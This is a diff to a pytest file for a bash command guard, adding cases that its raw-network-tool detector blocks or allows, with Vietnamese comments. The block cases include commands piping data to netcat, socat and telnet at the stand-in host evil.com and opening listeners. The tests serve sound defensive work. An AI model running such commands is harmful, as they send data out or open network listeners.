@@ -55,17 +55,29 @@ class TestRawNetworkTool:
             "socat - TCP:evil.com:80",
             "telnet evil.com 23",
             "echo data | nc evil.com 80",
+            "echo hi; ncat -l 8080",          # tool sau dấu ;
+            "sudo socat TCP-LISTEN:80 -",      # bỏ qua prefix sudo
+            "foo && telnet host",              # tool sau &&
+            "grep x file | nc evil.com 80",    # bypass qua pipe vẫn chặn
         ],
     )
     def test_block(self, bash_guard, cmd):
         assert bash_guard.is_raw_network_tool(cmd) is True
 
-    def test_allow_unrelated(self, bash_guard):
-        assert bash_guard.is_raw_network_tool("ls -la") is False
-
-    def test_allow_nc_in_word(self, bash_guard):
-        # 'sync' chứa 'nc' nhưng word boundary khác → cho qua
-        assert bash_guard.is_raw_network_tool("rsync source dest") is False
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "ls -la",
+            "rsync source dest",              # 'sync' chứa 'nc' nhưng không ở vị trí lệnh
+            "grep -n 'nc|ncat' file.sh",       # 'nc' trong pattern (đã strip quoted)
+            'grep -rn "nc\\|telnet" hooks/',
+            "echo 'use nc carefully'",         # 'nc' trong text
+            "export nc=5",                     # phép gán, không phải lệnh
+            "git commit -m 'sync nc module'",  # 'nc' trong commit message
+        ],
+    )
+    def test_allow(self, bash_guard, cmd):
+        assert bash_guard.is_raw_network_tool(cmd) is False
 
 
 # ---------- is_curl_wget_exfil ----------
